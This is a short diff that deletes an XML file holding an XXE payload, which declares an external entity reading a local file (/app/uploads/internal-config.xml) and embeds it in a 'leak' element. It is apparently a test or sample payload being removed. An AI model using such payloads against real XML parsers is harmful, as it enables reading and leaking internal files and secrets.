@@ -1,7 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE data [
-  <!ENTITY config SYSTEM "file:///app/uploads/internal-config.xml">
-]>
-<leak>
-  <internal>&config;</internal>
-</leak> 
